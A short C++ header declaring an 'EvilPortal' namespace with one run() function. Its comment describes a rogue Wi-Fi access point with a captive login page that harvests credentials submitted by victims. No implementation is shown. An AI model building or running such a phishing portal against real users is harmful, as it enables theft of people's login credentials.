#pragma once
// bySaw Evil Portal — open rogue AP + captive portal that serves a (optionally
// SD-templated) login page and harvests whatever credentials victims submit.
namespace EvilPortal {
void run();
}
